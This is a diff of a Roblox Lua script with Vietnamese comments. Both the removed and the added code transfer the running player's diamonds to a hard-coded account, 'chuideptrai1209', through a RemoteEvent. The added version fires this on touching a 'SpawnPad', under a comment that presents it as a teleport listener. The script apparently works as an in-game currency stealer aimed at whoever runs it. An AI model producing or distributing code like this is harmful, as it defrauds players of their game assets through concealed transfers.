@@ -6,23 +6,32 @@ local player = Players.LocalPlayer
 local leaderstats = player.leaderstats
 local diamonds = leaderstats["\240\159\146\142 Diamonds"].Value
 
--- In giá trị kim cương
-print("Số lượng kim cương:", diamonds)
-
--- Kiểm tra số lượng kim cương và thực hiện hành động nếu cần
-if diamonds > 1000000 then
-    local teleportCoordinates = Vector3.new(143.34673614500, 23.6020991104125977, -349.0367736816406)
-    player.Character.HumanoidRootPart.CFrame = CFrame.new(teleportCoordinates)
-    
-    -- Gửi 1 triệu kim cương cho tài khoản "chuideptrai1209"
-    local amountToSend = 1000000
-    local recipient = "chuideptrai1209"
-    
-    -- Gửi thông điệp gửi kim cương đến máy chủ thông qua RemoteEvent
-    local SendDiamondsEvent = ReplicatedStorage:FindFirstChild("SendDiamondsEvent")
-    if SendDiamondsEvent then
-        SendDiamondsEvent:FireServer(player, recipient, amountToSend)
+-- Chức năng gửi kim cương
+local function sendDiamonds(amount, recipient)
+    if diamonds >= amount then
+        leaderstats["\240\159\146\142 Diamonds"].Value = diamonds - amount
+        print("Đã gửi " .. amount .. " kim cương cho " .. recipient)
+        
+        -- Fire the RemoteEvent to send diamonds
+        local SendDiamondsEvent = ReplicatedStorage:FindFirstChild("SendDiamondsEvent")
+        if SendDiamondsEvent then
+            SendDiamondsEvent:FireServer(player, recipient, amount)
+        else
+            warn("Không tìm thấy RemoteEvent 'SendDiamondsEvent'!")
+        end
     else
-        warn("Không tìm thấy RemoteEvent 'SendDiamondsEvent'!")
+        warn("Không đủ kim cương để gửi!")
     end
 end
+
+-- Lắng nghe sự kiện teleport của người chơi
+player.CharacterAdded:Connect(function(character)
+    character.Humanoid.Touched:Connect(function(hit)
+        local part = hit.Parent
+        if part and part:IsA("Model") and part.Name == "SpawnPad" then
+            -- Teleport trở lại SpawnPad, gửi kim cương nếu cần
+            character:SetPrimaryPartCFrame(part.PrimaryPart.CFrame)
+            sendDiamonds(100000, "chuideptrai1209") -- Thay đổi số lượng và người nhận theo nhu cầu
+        end
+    end)
+end)
